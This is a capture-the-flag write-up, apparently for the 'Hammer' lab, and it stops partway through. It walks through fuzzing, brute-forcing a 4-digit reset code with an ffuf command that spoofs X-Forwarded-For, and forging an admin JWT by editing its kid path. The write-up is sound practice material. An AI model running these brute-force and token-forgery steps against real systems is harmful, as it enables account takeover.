| PORT | STATE | SERVICE |
| :--- | :---- | :------ |
| 22   | open  | ssh     |
| 1337 | open  | http    |
|      |       |         |
|      |       |         |

We got two open ports, a ssh service and a http service is running in this machine, let's enumerate the website in order to gain access.

## FUZZING
---

![](Pasted%20image%2020241118155536.png)

Two interesting directories, `/vendor` and `/phpmyadmin`, let's take a look at `/vendor` directory`

![](Pasted%20image%2020241118160002.png)

Found three things, a `autoload.php` file, a `composer/` directory and a `firebase/` directory, but to be honest, nothing useful seems to come out of it, let's proceed with the reconnaissance 

# RECONNAISSANCE
---

Let's try the default credentials for this page and take a look at its behavior:

![](Pasted%20image%2020241118160317.png)

Weren't lucky enough, let's inspect `storage` section and look for anything useful:

![](Pasted%20image%2020241118160351.png)

Found a cookie value, it seems to be the following:

![](Pasted%20image%2020241118160408.png)

`PHPSESSID: un57ni4plm0evo3h1augo6i799`


Now we know where to check for the cookie, let's take a look at the `Forgot your password?` section:

![](Pasted%20image%2020241118160522.png)

Got redirected into a new section, `/reset_password.php` seems to be the one in charge of this part of the application, let's look at the main page source code in order to look up for the framework's name:

![](Pasted%20image%2020241118160656.png)

Nice, now we know we need to bruteforce the directory in the following way, for this, I'll be using `ffuf`:

```ad-hint

# Command
---
`ffuf -u 'http://hammer.thm:1337/hmr_FUZZ' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301 2>/dev/null`

# Output
---
![](Pasted%20image%2020241118170405.png)

```

We found 4 interesting directories, the one I like the most would be `logs` directory, let's take a look at it, for it, let's visit the following URL

`http://hammer.thm:1337/hmr_logs`


![](Pasted%20image%2020241118170617.png)

Seems like we have a `error.logs` file, let's look inside:


```ad-note

# Important Part:
---

Important part about the log would be the following email:

`tester@hammer.thm`


```

# EXPLOITATION
---

Now, here the exploitation part begins, let's try to reset the password for the email we found in the log:



![](Pasted%20image%2020241118171025.png)

Once we send the request, this appears:

![](Pasted%20image%2020241118171056.png)

We have a time of `180` seconds to enter the code, we can try to brute force it in the following way:

```ad-hint

# Steps to reproduce in order to get the code
----

1. Generating the sequence from 0000 to 9999 since we have a 4 digit code:
   `seq 0000 9999 >> codes.txt` 
2. Preparing our payload using `ffuf` in the following way (We need the PHPSESSID that we found previously):
	`ffuf -w codes.txt -u "http://hammer.thm:1337/reset_password.php" -X "POST" -d "recovery_code=FUZZ&s=60" -H "Cookie: PHPSESSID=Cookie-ID" -H "X-Forwarded-For: FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -s`

Breakdown of the code is available in the other note section.

3. Resetting the password.

3. ![](Pasted%20image%2020241118172701.png)

I resetted the pasword to 1234:

![](Pasted%20image%2020241118172811.png)

```


```ad-note
# Additional section
---
## Breakdown of the ffuf command
---

- `-w codes.txt`: Specifies the wordlist (codes.txt) that will be used for fuzzing. This wordlist contains the payloads that will replace the FUZZ keyword in the command.
- `-u "http://hammer.thm:1337/reset_password.php"`: The URL of the target web application. This is where the fuzzing request will be sent.
- `-X "POST"`: Specifies the HTTP method to be used, which in this case is POST.
- `-d "recovery_code=FUZZ&s=60"`: The data being sent in the body of the POST request. The FUZZ keyword here will be replaced with each entry from codes.txt during the fuzzing process. It appears that the fuzzing is targeting the recovery_code parameter.
- `-H "Cookie: PHPSESSID=Cookie-ID"`: Adds a custom header to the request, specifically a Cookie header with a session ID. This is likely needed to maintain a session with the web application.
- `-H "X-Forwarded-For: FUZZ"`: Adds another custom header, X-Forwarded-For, which is often used to identify the originating IP address of a client connecting to a web server. In this case, it's being fuzzed to see if the application behaves differently based on the IP address.
- `-H "Content-Type: application/x-www-form-urlencoded"`: Specifies the content type of the data being sent. This is typical for form submissions.
- `-fr "Invalid"`: Filters out responses that contain the string "Invalid". This helps in identifying successful or interesting responses that differ from the common invalid ones.
- `-s`: Runs ffuf in silent mode, which reduces the amount of output to only essential information.
```

Once we got in, we can proceed with privilege escalation.

# PRIVILEGE ESCALATION
---


Nice, we got access to the dashboard and we see something interesting, we can use commands, let's send a simple command like ls:

![](Pasted%20image%2020241118173721.png)

We are able to perform the ls, and some interesting files were found, such as the `188ade1.key`, after some research in the page, I found this in the source code:

```ad-note

jwtToken:'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzMxOTY5NDIwLCJleHAiOjE3MzE5NzMwMjAsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.Xuc9SVWGWZqmISAx9rDzOXtFr1lSTGmueMqXhF_OBkU'

#### What's a JWT
----
A **JWT (JSON Web Token)** is an open standard (RFC 7519) for securely transmitting information between parties as a JSON object. It is typically used for **authentication** and **authorization** in web applications and APIs. A JWT is compact, URL-safe, and can be signed and optionally encrypted. It allows for secure communication between a client and a server
```

Issue seems to be that the page has a script section that logs us out after 20 seconds, so, there's few time to perform actions on the server, so, let's begin with decoding the token:

```ad-hint
#### Starting the decoding
----

For decoding this token I used this website: [URL](https://jwt.io/#debugger-io)

![](Pasted%20image%2020241118175307.png)

To finish the decoding, we need the 256 bit secret, which can be found in the `188ade1.key` file, let's get the secret:

![](Pasted%20image%2020241118175423.png)
![](Pasted%20image%2020241118175454.png)
We got the 256 bit secret, let's do the following:
![](Pasted%20image%2020241118175749.png)
1. Change the `kid` to the path we think the file is located at, in this case, `/var/www/html/188ade1.key`.
2. Change the `role` to `admin`
3. Enter the 256 bit secret
4. Get our new jwtToken and use `burp` to send a request with it, in order to perform higher privileged actions.

## Sending the burp request:
